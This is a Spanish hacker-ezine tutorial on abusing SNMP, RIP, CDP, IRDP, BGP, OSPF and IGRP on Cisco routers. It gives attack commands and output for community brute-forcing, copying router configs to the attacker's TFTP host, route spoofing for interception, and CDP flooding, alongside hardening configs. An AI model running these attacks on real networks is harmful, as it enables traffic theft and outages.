@@ -1,0 +1,620 @@
+   <- [ Eko Magazine 3 Revange ] ----- [ La Venganza del Oso Arturo.... ] ->
+   <----- [ ca0s #Ezkracho ] ------------- { caos@Ezkracho.com.ar } ------->
+   <-------------- [ Ataque de Protocolos a Routers CISCO. ] -------------->
+
+
+
+
+
+
+                XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+	      
+	             Ataque de protocolos a routers CISCO.
+	
+                XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+	      
+	                           by ca0s
+				
+		             caos@ezkracho.com.ar
+
+
+
+
+
+
+
+----[ Introduccion ]-
+
+
+"Cada vez que vos envias un mensaje por Internet, cada vez que transferis un
+archivo a traves de tu PC, cada vez que accedes a informacion en la Intranet
+de tu empresa... hay una alta probabilidad de que el hardware y software de
+networking de Cisco esten involucrados en ese proceso."
+
+                                                   Cisco Systems .-
+
+Porque debemos preocuparnos por la seguridad en routers Cisco? creo que pueden
+encontrar la respuesta un poco mas arriba.
+
+Generalmente cuando realizamos un penetration testing a un router, lo primero
+que vamos a probar va a ser passwords por default y los muy pocos bugs que se
+pueden aprovechar del IOS; en este texto vamos a usar otras tecnicas no muy 
+conocidas basadas en el abuso de algunos protocolos.
+
+Voy a intentar dar una breve explicacion del funcionamiento de cada protocolo
+pero tengan en cuenta que este texto no trata sobre eso, si no solo sobre los
+problemas de seguridad que tienen. Todos los programas mencionados los pueden
+encontrar en la seccion de Recursos al final de este texto.
+
+Cualquier comentario sera bien recibido, mientras que las dudas o criticas
+me las pueden enviar a root@localhost.
+
+
+
+----[ Protocolo SNMP ]-
+
+
+El Simple Network Management Protocol (Puerto 161/UDP) fue dise~ado para
+administrar dispositivos de red de una forma sencilla. Cada mensaje que es
+enviado al agente en el router es autenticado mediante un password conocido
+como "community". Existen dos tipos de privilegios, el Read Only (solo lectura)
+y el Read Write (lectura y escritura).
+
+Con la version 1 de este protocolo(SNMPv1) los community's son enviados a la
+red en texto plano, permitiendo a cualquiera que pueda capturar paquetes en
+la red descubrir el community.
+
+Como ejemplo vamos a usar un sniffer, en este caso el dsniff, para capturar
+el community de una sesion:
+
+ foo# ./dsniff -d -i eth0 -s 1024 -m
+ -----------------
+ 08/27/01 16:20:13 udp 192.168.100.20.1052 ->
+ 192.168.100.1.161 (snmp)
+ [version 1]
+ public       <--------------------[ Aqui vemos el community. ]
+
+ -----------------
+ 08/27/01 16:20:13 udp 192.168.100.1.161 ->
+ 192.168.100.20.1052 (snmp)
+ [version 1]
+ public       <--------------------[ Aqui vemos el community. ]
+
+Con el SNMP version 2(SNMPv2) se a~adio el algoritmo MD5 para realizar la
+autenticacion, y verificar la integridad y el origen de las transmisiones;
+esta version del protocolo tambien permite la encriptacion de la comunicacion
+usando el algoritmo DES.
+
+Actualmente se cuenta con las version 3(SNMPv3) que posee grandes mejoras en
+cuanto a seguridad, pero en la mayoria de los casos nos vamos a encontrar
+con SNMPv1 implementado en los routers.
+
+Mas alla de las debilidades que posee este protocolo, uno de los factores mas
+importantes que va a afectar la seguridad son los community's por default que
+ponen los fabricantes, y por supuesto los community's muy faciles de adivinar
+que ponen los administradores.
+
+Para hacer una prueba de cuantos dispositivos con este problema podemos
+encontrar, vamos a utilizar un script que scannee una red haciendo un brute
+force de los community's:
+
+ foo# perl tripper.pl -d 192.168.100.*
+  -- tripper.pl 1.0 - ca0s [Ezkracho Team] - http://www.ezkracho.com.ar/
+
+ (*) [192.168.100.35] --> Community Name Found: 'public' 'private' 
+  - SYSTEM NAME: sw-dis
+  - SYSTEM UPTIME: 114 days, 15:38:38.73
+  - SYSTEM DESCRIPTION: Cisco Internetwork Operating System Software 
+ IOS (tm) C2900XL Software (C2900XL-C3H2S-M), Version 12.0(5.2)XU, MAINTENANCE
+ INTERIM SOFTWARE
+ Copyright (c) 1986-2000 by cisco Systems, Inc.
+ Compiled Mon 17-Jul-00 17:35 by ayounes
+
+ (*) [192.168.100.69] --> Community Name Found: 'public'
+  - SYSTEM NAME: sw2820b
+  - SYSTEM UPTIME: 46 days, 06:34:58.93
+  - SYSTEM DESCRIPTION: Cisco Systems Catalyst 2820,V9.00.00    
+
+Una vez que encontramos el community del RW podemos modificar cualquier valor
+dentro de la tabla MIB del dispositivo.
+
+Por ejemplo para cambiar el nombre del contacto hacemos lo siguiente:
+
+ foo# snmpset 10.1.1.4 private system.sysContact.0 s "Carlin, El Hacker 2001"
+ system.sysContact.0 = Carlin, El Hacker 2001
+
+ foo# snmpwalk 10.1.1.4 private system
+ system.sysDescr.0 = Cisco Internetwork Operating System Software
+ IOS (tm) 2500 Software (C2500-IS-L), Version 11.2(9)P, RELEASE SOFTWARE
+ (fc1)
+ Copyright (c) 1986-1997 by cisco Systems, Inc.
+ Compiled Tue 30-Sep-97 17:12 by ccai
+ system.sysObjectID.0 = OID: enterprises.9.1.30
+ system.sysUpTime.0 = Timeticks: (3846017968) 445 days, 3:22:59.68
+ system.sysContact.0 = Carlin, El Hacker 2001
+ system.sysName.0 = Gestion1
+ system.sysLocation.0 =
+ system.sysServices.0 = 6
+
+O para bajarnos el archivo de configuracion del router a nuestro TFTP hacemos
+lo siguiente:
+
+ (todo en una linea)
+ foo# snmpset ip.del.router community 1.3.6.1.4.1.9.2.1.55.ip.de.tu.maquina
+ string config.file
+
+Desde estos simples ejemplos, hasta cambiar el gateway del router hacia nuestro
+box para poder sniffear todo el trafico, podemos decir que SNMP es una poderosa
+herramienta de administracion pero representa un grave peligro cuando no esta
+configurada correctamente. Sin mencionar que usar UDP para cualquier tarea que
+requiere un minimo de seguridad nunca es una muy buena idea.
+
+En la mayoria de los casos no es necesario tener SNMP en nuestros routers, por
+lo que lo mas recomendable es desactivarlo:
+
+ router(config)# no snmp-server
+
+Ahora si lo necesitamos tener habilitado hay que evaluar que uso le daremos,
+ya que por ejemplo si lo unico que necesitamos es sacar estadisticas de los
+routers con el acceso de solo lectura alcanza:
+
+ router(config)# snmp-server community <contrase~a> RO
+ 
+Para configurar el acceso de lectura/escritura es practicamente el mismo
+procedimiento:
+
+ router(config)# snmp-server community <contrase~a> RW
+
+En ambos casos es muy importante poner contrase~as dificiles, y si ya vinieron
+puestas por el fabricante asegurarse de cambiarlas. Pero tambien podemos usar
+access lists para indicar desde que hosts unicamente se puede acceder:
+
+ router(config)# access-list 1 permit 192.168.100.1
+ router(config)# access-list 1 permit 10.0.0.1
+ router(config)# snmp-server community <contrase~a> RW 1
+
+Otra alternativa con access lists es definir desde que red se pueden hacer
+conexiones para usar SNMP:
+
+ router(config)# access-list 101 permit udp 192.168.100.0 0.0.0.255 any eq 161
+
+O tambien poner una access list en nuestro border router que deniegue cualquier
+intento de conexion SNMP:
+
+ router(config)# access-list 101 deny udp any any eq 161
+
+De esta forma todos los dispositivos de nuestra red interna tambien estaran
+protegidos.
+
+
+
+----[ Protocolo RIP ]-
+
+
+El Routing Information Protocol (Puerto 520/UDP) basicamente provee un
+sistema de mantenimiento y actualizacion de tablas de ruteo. Cada router
+constantemente envia una copia de su tabla hacia el broadcast de su subred
+para que otros routers conozcan estas rutas. Si una ruta no es actualizada
+en un determinado periodo de tiempo se presume que esta caida.
+
+Podemos encontrar dispositivos usando RIP simplemente escaneando por el
+puerto 520 de UDP:
+
+ foo# nmap -sU 192.168.100.0/24 -p 520
+
+ Interesting ports on  (192.168.100.57):
+ Port       State       Service
+ 520/udp    open        route
+
+RIP no trabaja correctamente con grandes redes debido a que solo soporta 15
+saltos. Hay dos versiones de RIP con marcadas diferencias. La version 1 solo
+comunica informacion sobre su propia tabla de ruteo, mientras que la version
+2 puede comunicar informacion sobre las tablas de ruteo de otros routers.
+
+El uso de RIPv1 representa un gran riesgo, ya que no posee ningun mecanismo
+de autenticacion y ya sabemos lo que el uso de UDP como medio de transporte
+representa. RIPv2 permite usar un password de 16 caracteres en texto plano,
+que cualquier sniffer lo puede capturar, o una firma con MD5 que dificulta
+mucho mas el spoof de packetes RIP.
+
+En el siguiente ejemplo vamos a usar el programa rprobe para que un router
+nos envie su tabla de ruteo, mientras que al mismo tiempo vamos a capturar
+toda la respuesta con tcpdump:
+
+ foo# ./rprobe 10.0.0.1
+ 
+ foo# tcpdump -vv -i eth0 -s 10000 udp and port 520
+
+La informacion obtenida no solo nos da valiosa informacion sobre la topologia
+de la red, si no que tambien nos ayuda a determinar cual es la mejor forma en
+que podemos realizar un ataque.
+
+Supongamos el siguiente caso. La sucursal SUC-A en Buenos Aires continuamente
+envia informacion a la sucursal SUC-B en Cordoba, en ese camino la informacion
+pasa a traves de los routers R-A, R-B y R-C que usan RIP:
+
+ SUC-A ---> R-A -------> R-B -------> R-C -------> SUC-B
+             |      |
+             |_.FOO.|
+
+Nosotros somos FOO y nuestro objetivo es capturar todos los datos que SUC-A
+envia a SUC-B. Lo que hacemos es decirle al router R-A que la mejor ruta para
+llegar a SUC-B es mediante FOO. Para hacer esto utilizamos el programa srip
+que nos permitira spoofear paquetes RIP:
+
+ foo# ./srip FOO R-A SUC-B 1
+
+Lo que le decimos al router R-A un poco mas a fondo, es que la cantidad de
+saltos para llegar al router R-B que lo dirige a SUC-B es mayor a la cantidad
+de saltos hasta llegar al supuesto router FOO que tambien lo dirige a SUC-B.
+Por eso al final del comando ponemos un "1", lo que significa que FOO se
+encuentra solo a un salto. Con una metrica de 1 deberiamos ganarle a cualquier
+otra ruta, pero suponiendo que R-B tambien este a un salto podemos mandarle
+un mensaje a R-A diciendole que R-B es una ruta muerta(metrica = 16) o que se
+encuentra a mas saltos que nosotros.
+
+En cualquier caso, siempre que nuestro objetivo sea el de sniffear datos, no
+debemos olvidarnos que antes de cambiar las rutas debemos tener preparada
+nuestra maquina para hacer el reenvio de paquetes. Si no queremos configurar
+nuestro sistema para hacer esto, podemos utilizar un programa como fragrouter:
+
+ foo# ./fragrouter -B1
+
+Para prevenir estos tipos de ataques es recomendable usar el protocolo Open
+Short Path First(OSPF), que viene con mas mecanismos de seguridad que RIP.
+
+En caso de que la red en cuestion no sea muy grande siempre es mas seguro
+usar rutas estaticas, pero si no hay otra opcion que usar RIP por lo menos
+no usen la version 1.
+
+Para finalizar, siempre que sea posible podemos denegar todos los paquetes
+RIP entrantes a la red seteando una access-list en el border router:
+
+ router(config)# access-list 101 deny udp any any eq 520
+
+De esta forma todos los dispositivos de nuestra red interna tambien estaran
+protegidos.
+
+
+
+----[ Protocolo CDP ]-
+
+
+El Cisco Discovery Protocol es un protocolo para descubrir dispositivos Cisco
+en una red. Este protocolo trabaja en la capa de Enlace de Datos (Capa 2) del
+modelo OSI. Esto le permite dialogar con otros dispositivos de Cisco sin
+importar el medio en que estos se encuentren (LAN, Frame Relay, ATM, etc.) y
+su protocolo asociado.
+
+Cada paquete CDP que se envia posee un tiempo de vida (TTL). Dentro de la
+informacion que envia un router podemos encontrar el hostname del dispositivo,
+el puerto de donde se envio el paquete, la plataforma que esta corriendo, el
+software y la version que usa, tareas que puede realizar y la direccion de red
+que posee la interfaz. Si no esta configurado de otra forma estos paquetes se
+enviaran cada 30 segundos. El destino sera una MAC address (01:00:0C:CC:CC:CC)
+especial, en caso de que estemos en ethernet, que permitira a cualquier otro
+router en el mismo segmento de red recibir la informacion enviada.
+
+El IOS utiliza el host del dispositivo como firma para saber si el paquete
+recibido por un router es una actualizacion, o si el router vecino ya era
+conocido o no.
+
+Actualmente se conocen dos formas en que podemos aprovechar este protocolo
+para nuestro beneficio.
+
+La primer forma es un simple ataque de Denial Of Service haciendo un flood de
+paquetes CDP con informacion falsa. Esto va a llenar toda la memoria de los
+routers, que se encuentren en ese segmento de red, y puede ocasionar que estos
+se reinicien o dejen de funcionar.
+
+Vamos a usar el programa cdp desarrollado por el grupo phenoelit para realizar
+este ataque:
+
+ foo# ./cdp -i eth0 -n 10000 -l 1480 -r
+
+La segunda forma de ataque es enviar paquetes CDP spoofeados. Esto no tiene
+mucha utilidad salvo que se desee confundir al administrador de la red con
+la existencia de un supuesto nuevo router.
+
+Lo podemos hacer de la siguiente forma:
+
+ (todo en una linea)
+ foo# ./cdp -v -i eth0 -m 1 -D 'Pr0sp3r0' -P 'Ethernet0' -C RI -L 'Echelon'
+ -S 'Windows 3.1' -F '255.255.255.255' 
+
+Para ver estos datos en un router hacemos:
+
+ router# sh cdp neig detail
+
+Ataques con CDP no es algo muy popular por muchas razones. Pero todo gira en
+que hoy en dia no se usa mucho CDP en los routers, no es una tecnica que de
+grandes beneficios salvo que se la asocie en conjunto con otra, y por supuesto
+que para poder realizar este tipo de ataque primero debemos tener acceso a la
+LAN del router.
+
+Siempre que sea posible lo ideal es no usar CDP en nuestros routers. Para
+desactivar su uso en todo el router hacemos:
+
+ router(config)# no cdp run
+
+Para desactivarlo en una interfaz en particular, como por ejemplo la interfaz
+Ethernet hacemos:
+
+ router(config)# interface Ethernet 0
+ router(config-if)# no cdp enable
+
+
+
+----[ Protocolo IRDP ]-
+
+
+El ICMP Router Discovery Protocol es una extencion del protocolo ICMP que
+provee a los routers de un mecanismo para anunciar rutas de salida en la red.
+El IRDP no es un protocolo de ruteo como lo puede ser RIP o IGRP.
+
+Este protocolo posee dos tipos de mensajes ICMP diferentes, uno de anuncio y
+otro de solicitacion. Los mensajes de anuncio son enviados en intervalos
+regulares, aunque un dispositivo puede realizar un mensaje de solicitacion en
+cualquier momento.
+
+Un mensaje de anuncio puede contener cualquier cantidad de direcciones de
+routers. Cada una de estas direcciones posee asociado un valor de preferencia. 
+Los dispositivos escuchando los mensajes de anuncio van a usar la direccion
+del router de salida con el mejor valor de preferencia.
+
+Un posible ataque seria enviarle a un dispositivo un mensaje de anuncio con
+una ruta que tenga un mejor valor de preferencia a la ruta que ya esta usando.
+
+Para ello vamos a usar el programa irdp de phenoelit:
+
+ foo# ./irdp -i eth0 -D 10.10.100.43
+
+Si se diera el caso de que el dispositivo ya use una ruta con un valor de
+preferencia optimo y no lo pudieramos mejorar, siempre esta la alternativa
+de realizar un ataque de DoS a ese router para desactivarlo y pasar a ser
+nosotros la mejor ruta. Si se presentara el escenario, podriamos utilizar el
+flood con paquetes CDP que habiamos comentado antes.
+
+Otro programa muy util es el irdpresponder, al cual lo podemos dejar esnifeando
+por mensajes de solicitacion para que los responda automaticamente:
+
+ foo# ./irdpresponder -i eth0
+
+El claro problema que vemos en IRDP, como en muchos otros protocolos, es que
+no posee ningun mecanismo de autenticacion. Con este protocolo al igual que
+con CDP, realizar un ataque es mas dificil de llevar a cabo porque implica un
+previo acceso a la LAN de nuestra victima.
+
+Lo mas recomendable es no usar este protocolo. Podemos desactivar su uso de
+la siguiente forma:
+
+ router(config-if)# no ip irdp
+
+Actualmente hay otros protocolos alternativos un poco mas seguros que IRDP y
+que cumplen mejor su funcion, por eso la recomendacion de no usarlo.
+
+
+
+----[ Protocolo BGP ]-
+
+
+El Border Gateway Protocol (Puerto 179/TCP) tiene como funcion realizar el
+ruteo entre diferentes redes. BGP es un Exterior Gateway Protocol (EGP), lo
+que significa que desarrolla ruteos entre diferentes dispositivos y redes y
+cambia estas rutas e informacion de disponibilidad con otros sistemas BGP.
+
+Este protocolo puede realizar cuatro tipos de mensajes diferentes: el open
+message, update message, notification message y keep-alive message. La tarea
+de cada uno de estos mensajes es bastante intuitiva por su nombre, pero el
+que mas nos va a interesar es el update message que contiene la informacion
+sobre las nuevas tablas de ruteo.
+
+Partiendo de la base de que BGP usa el Transmission Control Protocol (TCP)
+como protocolo de transporte, esto abre las puertas a todos los problemas que
+se pueden encontrar en el. Lo mas comun seria ataques de SYN flood, otros
+ataques de DoS, y la posibilidad de enviar tablas de ruteo falsas. Realizar
+esto ultimo se complica bastante, ya que los routers Cisco usan TCP sequence
+numbers muy poco predecibles y por lo tanto un spoofing es mas dificil de
+realizar.
+
+Ataques con BGP no es algo muy popular debido a su complejidad, pero lo mas
+productivo que podriamos llegar a sacar de el es realizar ataques de DoS con
+algun fin en particular o insertar tablas de ruteo por otro protocolo, como
+RIP por ejemplo, y dejar que BGP se encargue de distribuirla.
+
+Para prevenir estos tipos de ataques es recomendable hacer access lists para
+filtrar el acceso de acuerdo a la topologia de nuestra red, filtrar basandose
+en el origen de las rutas, y siempre usar MD5 como mecanismo de autenticacion.
+
+
+
+----[ Protocolo OSPF ]-
+
+
+El Open Shortest Path First nace para reemplazar al RIP principalmente por
+las limitaciones que este ultimo presenta en las redes de hoy en dia. Mas alla
+de esta nueva alternativa Cisco implementa ambos protocolos en sus routers.
+
+OSPF es un protocolo que trabaja con "link states", lo que significa que al
+contrario de RIP donde cada router actualiza su tabla de ruteo basandose en
+saltos de distancia, con OSPF cada router chequea el enlace con su router
+vecino y le manda esta informacion a sus otros routers vecinos, de esta forma
+cada router puede construir su propia tabla de ruteo.
+
+Los LSA (Link State Advertisements) son los mensajes que contienen el estado
+de uno o mas enlaces y con los que OSPF se va a comunicar con los routers de
+esa red. El header de un paquete LSA contiene estos elementos: LS age, option,
+LS type, Link state ID, Advertising Router ID, LS sequence number, LS checksum,
+y length. Teniendo un profundo conocimiento del protocolo, es posible modificar
+algunos elementos de un LSA interceptando y reinyectando paquetes OSPF.
+
+Otra forma de comunicacion es mantenida mediante el uso de paquetes "Hello"
+o de saludo, en la que cada diez segundos se va a enviar informacion sobre
+enlaces conocidos a la direccion multicast 224.0.0.5. Una vez que un router
+recibe un paquete Hello comienza el proceso de sincronizar su tabla con la de
+otros routers.
+
+OSPF puede ser configurado para no usar autenticacion, usar passwords en
+texto plano o usar MD5. Obviamente si se logra tener acceso a la LAN y el
+router esta usando passwords en texto plano es posible capturarlo con un
+sniffer.
+
+Actualmente se conocen cuatro tipos de ataques que pueden ser usados contra
+OSPF, ellos son Max Age attack, Sequence++ attack, Max Sequence attack y
+Bogus LSA attack. Generalmente su usan para realizar ataques de DoS (Denial
+of Service) enviando paquetes OSPF modificados. En teoria con el Max Sequence
+attack es posible inyectar un paquete con el numero de secuencia maximo
+(0x7FFFFFFF) y decir que nosotros somos la mejor ruta para redireccionar
+todo el trafico de la red. 
+
+Estos ultimos tipos de ataques mencionados fueron realizados en laboratorios,
+y debido a la complejidad que representan y a la existencia de alternativas
+mucho mas sencillas es muy dificil que las veamos "in the wild".
+
+Todos los ataques que vimos que involucraban la modificacion de paquetes OSPF
+las podemos realizar con el nemesis-ospf, que es parte de "The Nemesis Project"
+un poderoso set de programas para la manipulacion de distintos protocolos.
+
+En este caso como con todo protocolo de enrutamiento siempre que sea posible
+es mejor no usarlo.
+
+ router(config)# no ospf enable
+
+La mayoria de las veces vamos a ver que simplemente usando rutas estaticas
+todo va a funcionar pefectamente bien y ahorrandonos posibles problemas.
+
+
+
+----[ Protocolo IGRP ]-
+
+
+El Interior Gateway Routing Protocol es un protocolo propietario de Cisco
+que surgio para salvar las limitaciones que tenia RIP.
+
+IGRP es un protocolo de vector de distancia, pero puede sumar otras metricas
+como ancho de banda y delay en la red al elegir una ruta. Esto por supuesto lo
+hace ampliamente superior a RIP que simplemente cuenta saltos.
+
+IGRP soporta un diametro de red de hasta 255 saltos, mientras que RIP solo 15,
+y envia mensajes de update cada 90 segundos. Este protocolo tambien posee otras
+caracteristicas como hold-downs, split horizons, y poison-reverse updates que
+mejoran mucho mas la estabilidad.
+
+IGRP al no poseer autenticacion se encuentra afectado por los clasicos ataques
+de rerouting. Una forma de realizar este tipo de ataques es con el programa
+"igrp", que es parte de una suite de programas llamado IRPAS de phenoelit.
+
+A continuacion vemos un ejemplo en el cual inyectamos la ruta 100.100.100.0
+al router 192.168.1.1 spoofeando el origen del router 192.168.1.254: 
+
+ foo# ./igrp -i eth0 -f routes.txt -a 10 -S 192.168.1.254 -D 192.168.1.1
+
+ foo# cat routes.txt:
+ # destination:delay:bandwith:mtu:reliability:load:hopcount
+ 100.100.100.0:500:1:1500:255:1:0
+
+Ahora con el comando "show ip route" vemos la nueva ruta inyectada en el
+router:
+
+ router#sh ip route
+ Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP
+    D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area
+    E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP
+    i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, * - candidate default
+    U - per-user static route
+
+ Gateway of last resort is not set
+
+ 10.0.0.0/8 is variably subnetted, 2 subnets, 2 masks
+ C  10.1.2.0/30 is directly connected, Tunnel0
+ S  10.0.0.0/8 is directly connected, Tunnel0
+ C  192.168.9.0/24 is directly connected, Ethernet0
+ C  192.168.1.0/24 is directly connected, Ethernet0
+ I  100.100.100.0/24 [100/1600] via 192.168.1.254, 00:00:05, Ethernet0
+
+Hoy en dia IGRP se encuentra en desuso, por lo tanto la mejor alternativa para
+prevenir estos ataques es simplemente deshabilitarlo:
+
+ router(config)# no router igrp <autonomous-system>
+
+O si nos es imprescindible usarlo, limitar su aplicacion unicamente a redes de
+confianza.
+
+
+
+----[ Conclusion ]-
+
+
+Cualquier tipo de ataque que se base en el abuso de un protocolo, siempre va
+a requerir un buen conocimiento del protocolo en si. 
+
+Sin duda alguna es mas simple bajarse, compilar y ejecutar un exploit que
+realizar la mayoria de los ataques mencionados. Pero un exploit depende de
+la plataforma, sistema, bug y configuracion de la victima, mientras que un
+ataque basado en protocolos funciona en casi cualquier sistema o dispositivo
+que lo implemente. Mas alla de que en este texto hablaramos solo de los
+routers Cisco.
+
+Para terminar, estos ataques pueden ser muy efectivos cuando los realizamos
+bien y causar un gran desastre cuando no. Por eso les recomiendo que si van
+a empezar a probar cosas, primero tomense el tiempo para saber bien como
+trabaja el protocolo y comprender que es lo que estan haciendo. 
+
+Y tambien tengan en cuenta que ya hay varios IDS's que pueden detectar estos
+tipos de ataques.
+
+Bueno eso es todo... espero que se diviertan ;)
+
+
+ca0s .-
+
+EZKRACHO Security Team
+EKO Web:  http://www.ezkracho.com.ar/
+HomePage: http://www.getrewted.com.ar/
+
+Shoutz to ppl: dr_fdisk^, Cinic, ][-][UNTER, ``S[h]iff'', s0t4ipv6, airlink,
+CyRaNo, kl0nk Manson, Dr|3xe.
+Shoutz to groups: Raza Mexicana, 0ri0n, Heineken, NetSearch, SET, Van Hackez.
+
+
+
+----[ Recursos ]-
+
+
+tripper.pl:
+http://www.ezkracho.com.ar/src/
+(publicado en esta ezine)
+
+dsniff:
+http://www.monkey.org/~dugsong/dsniff/
+
+tcpdump:
+http://www.tcpdump.org/
+
+nmap:
+http://www.insecure.org/nmap/
+
+snmpwalk, snmpset:
+ftp://ucd-snmp.ucdavis.edu/ucd-snmp.tar.gz
+
+MIBs de Cisco:
+ftp://ftp.cisco.com/pub/mibs/
+
+rprobe, srip:
+http://www.technotronic.com/horizon/rprobe.c
+http://www.technotronic.com/horizon/srip.c
+
+fragrouter:
+http://www.w00w00.org/files/sectools/fragrouter.tgz
+
+IRPAS(irdp, irdpresponder, igrp):
+http://www.phenoelit.de/
+
+nemesis:
+http://jeff.wwti.com/nemesis/
+
+
+
+<$[ Eko Magazine 3 Revange EOF. ]$>
+<$$[ Ataque de Protocolos a Routers CISCO. ]$$>
